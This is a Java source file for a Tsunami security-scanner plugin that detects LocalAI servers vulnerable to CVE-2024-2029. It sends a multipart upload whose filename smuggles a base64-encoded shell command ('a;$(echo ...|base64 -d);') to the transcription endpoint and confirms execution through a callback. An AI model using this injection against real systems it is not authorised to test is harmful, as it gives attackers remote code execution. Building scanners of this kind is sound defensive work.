/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.rce.cve20242029;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.common.net.HttpHeaders.USER_AGENT;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.BaseEncoding;
import com.google.common.io.Resources;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonParseException;
import com.google.gson.JsonParser;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.NotImplementedException;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.plugins.detectors.rce.cve20242029.Annotations.OobSleepDuration;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects exposed LocalAI API server. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ExposedLocalAIDetector",
    version = "0.1",
    description =
        "This plugin detects exposed LocalAI API serve that vulnerable to cve-2024-2029."
            + "this CVE allows attacker to inject arbitrary OS commands "
            + "during a file upload upload by a POST HTTP request",
    author = "TheVampKid",
    bootstrapModule = LocalAiCve20242029RceDetectorBootstrapModule.class)
public final class LocalAiCve20242029RceDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final PayloadGenerator payloadGenerator;
  private final Clock utcClock;
  private final HttpClient httpClient;
  private final int oobSleepDuration;

  @Inject
  LocalAiCve20242029RceDetector(
      HttpClient httpClient,
      @UtcClock Clock utcClock,
      PayloadGenerator payloadGenerator,
      @OobSleepDuration int oobSleepDuration) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.oobSleepDuration = oobSleepDuration;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting LocalAI CVE-2024-2029 RCE detection.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::checkIfLocalAiWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean checkIfLocalAiWebService(NetworkService networkService) {
    String targetUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);

    String modelsUrl = targetUrl + "models";
    HttpResponse response;
    try {
      response = httpClient.send(get(modelsUrl).withEmptyHeaders().build(), networkService);
    } catch (IOException e) {
      throw new RuntimeException(e);
    }
    if (response.bodyJson().isEmpty()) {
      return false;
    }
    return !response.bodyJson().get().getAsJsonObject().get("object").getAsString().isEmpty();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    var payload = getTsunamiCallbackHttpPayload();
    if (payload == null || !payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atWarning().log(
          "The Tsunami callback server is not setup for this environment, so we cannot confirm the"
              + " RCE callback");
      return false;
    }

    String targetUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);

    String modelsUrl = targetUrl + "models";
    try {
      HttpResponse response =
          httpClient.send(get(modelsUrl).withEmptyHeaders().build(), networkService);
      if (response.bodyString().isEmpty()) {
        return false;
      }
      ByteArrayOutputStream output = new ByteArrayOutputStream();

      // starting the building of the HTTP POST Body
      output.write("--------------------------YMvF9bJTpBcQA5CcxzUEx3\r\n".getBytes(UTF_8));
      output.write(
          String.format(
                  "Content-Disposition: form-data; name=\"file\";"
                      + " filename=\"a;$(echo %s|base64 -d);\"\r\n\r\n",
                  BaseEncoding.base64().encode(payload.getPayload().getBytes(UTF_8)))
              .getBytes(UTF_8));
      output.write("".getBytes(UTF_8)); // empty file
      output.write("\r\n".getBytes(UTF_8));
      output.write("--------------------------YMvF9bJTpBcQA5CcxzUEx3\r\n".getBytes(UTF_8));
      output.write("Content-Disposition: form-data; name=\"model\"\r\n\r\n".getBytes(UTF_8));

      try {
        JsonArray models =
            JsonParser.parseString(response.bodyString().get())
                .getAsJsonObject()
                .get("data")
                .getAsJsonArray();
        for (JsonElement model : models) {
          String modelStr = model.getAsJsonObject().get("id").getAsString();
          // continue the building of the HTTP POST Body
          output.write(modelStr.getBytes(UTF_8));
          output.write("\r\n".getBytes(UTF_8));
          output.write("--------------------------YMvF9bJTpBcQA5CcxzUEx3--\r\n".getBytes(UTF_8));
          byte[] out = output.toByteArray();
          // end of the building of the HTTP POST Body
          HttpResponse httpResponse =
              httpClient.send(
                  post(targetUrl + "v1/audio/transcriptions")
                      .setHeaders(
                          HttpHeaders.builder()
                              .addHeader(
                                  CONTENT_TYPE,
                                  "multipart/form-data;"
                                      + " boundary=------------------------YMvF9bJTpBcQA5CcxzUEx3")
                              .addHeader(USER_AGENT, "TSUNAMI_SCANNER")
                              .build())
                      .setRequestBody(ByteString.copyFrom(out))
                      .build(),
                  networkService);
          if (httpResponse.bodyString().isEmpty()) {
            continue;
          }
          Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
          return payload.checkIfExecuted();
        }

      } catch (IllegalStateException | NullPointerException | JsonParseException e) {
        logger.atWarning().withCause(e).log("Unable to parse response body as json");
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUrl);
    }
    return false;
  }

  private Payload getTsunamiCallbackHttpPayload() {
    try {
      return this.payloadGenerator.generate(
          PayloadGeneratorConfig.newBuilder()
              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
              .setInterpretationEnvironment(
                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
              .setExecutionEnvironment(
                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
              .build());
    } catch (NotImplementedException n) {
      return null;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2024_2029"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2024-2029 LocalAI Remote Code Execution")
                .setRecommendation(
                    "LocalAI user should upgrade the LocalAI to the versions v2.10.0 and above.")
                .setDescription(
                    "Publicly exposed LocalAI instances before v2.7.0 are vulnerable to"
                        + " Remote Code Execution Vulnerability. Attackers can inject arbitrary "
                        + "OS commands within the audio filename filed during uploading"
                        + " the audio file with a POST HTTP request and send it to the "
                        + "v1/audio/transcriptions endpoint."))
        .build();
  }
}
